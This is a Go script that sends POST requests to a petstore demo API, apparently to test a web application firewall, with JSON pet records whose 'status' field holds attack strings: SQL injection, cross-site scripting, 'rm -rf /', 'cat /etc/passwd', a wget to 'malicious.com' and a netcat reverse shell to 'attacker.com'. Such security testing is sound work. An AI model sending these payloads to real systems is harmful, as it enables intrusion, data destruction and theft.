package main

import (
        "bytes"
        "fmt"
        "math/rand"
        "net/http"
        "os"
        "time"
)

func main() {
        url := "http://petstore.wcfdemo.com/api/v3/pet"
        attackPayloads := []string{
                `{"id": 110, "category": {"id": 110, "name": "Camel"}, "name": "FortiCamel", "photoUrls": ["Willupdatelater"], "tags": [{"id": 110, "name": "FortiCamel"}], "status": "ls;;;;;cmd.exe"}`,
                `{"id": 111, "category": {"id": 111, "name": "Dog"}, "name": "FortiDog", "photoUrls": ["Willupdatelater"], "tags": [{"id": 111, "name": "FortiDog"}], "status": "<script>alert('XSS');</script>"}`,
                `{"id": 112, "category": {"id": 112, "name": "Cat"}, "name": "FortiCat", "photoUrls": ["Willupdatelater"], "tags": [{"id": 112, "name": "FortiCat"}], "status": "1 OR 1=1"}`,
                `{"id": 113, "category": {"id": 113, "name": "Bird"}, "name": "FortiBird", "photoUrls": ["Willupdatelater"], "tags": [{"id": 113, "name": "FortiBird"}], "status": "rm -rf /"}`,
                `{"id": 114, "category": {"id": 114, "name": "Fish"}, "name": "FortiFish", "photoUrls": ["Willupdatelater"], "tags": [{"id": 114, "name": "FortiFish"}], "status": "<img src=x onerror=alert('XSS') />"}`,
                `{"id": 115, "category": {"id": 115, "name": "Turtle"}, "name": "FortiTurtle", "photoUrls": ["Willupdatelater"], "tags": [{"id": 115, "name": "FortiTurtle"}], "status": "cat /etc/passwd"}`,
                `{"id": 116, "category": {"id": 116, "name": "Hamster"}, "name": "FortiHamster", "photoUrls": ["Willupdatelater"], "tags": [{"id": 116, "name": "FortiHamster"}], "status": "' OR '1'='1'; --"}`,
                `{"id": 117, "category": {"id": 117, "name": "Rabbit"}, "name": "FortiRabbit", "photoUrls": ["Willupdatelater"], "tags": [{"id": 117, "name": "FortiRabbit"}], "status": "<iframe src=javascript:alert('XSS')></iframe>"}`,
                `{"id": 118, "category": {"id": 118, "name": "Snake"}, "name": "FortiSnake", "photoUrls": ["Willupdatelater"], "tags": [{"id": 118, "name": "FortiSnake"}], "status": "wget http://malicious.com"}`,
                `{"id": 119, "category": {"id": 119, "name": "Lizard"}, "name": "FortiLizard", "photoUrls": ["Willupdatelater"], "tags": [{"id": 119, "name": "FortiLizard"}], "status": "nc -e /bin/sh attacker.com 1234"}`,
        }

        rand.Seed(time.Now().UnixNano())

        fmt.Println("-------------------------------------------------------------------------------------------------------------------")
        fmt.Printf("Sending API POST requests to %s to test for various vulnerabilities\n", url)
        fmt.Println("-------------------------------------------------------------------------------------------------------------------")

        for i := 0; i < 10; i++ {
                randomIndex := rand.Intn(len(attackPayloads))
                payload := attackPayloads[randomIndex]

                statusCode := sendPostRequest(url, payload)
                fmt.Printf("Sent payload %d: %s - HTTP status = %d\n", i+1, payload, statusCode)
        }

        fmt.Println()
}

func sendPostRequest(url, payload string) int {
        client := &http.Client{}
        req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(payload)))
        if err != nil {
                fmt.Println("Error creating request:", err)
                os.Exit(1)
        }

        req.Header.Set("accept", "application/json")
        req.Header.Set("Content-Type", "application/json")

        resp, err := client.Do(req)
        if err != nil {
                fmt.Println("Error sending request:", err)
                os.Exit(1)
        }
        defer resp.Body.Close()

        return resp.StatusCode
}
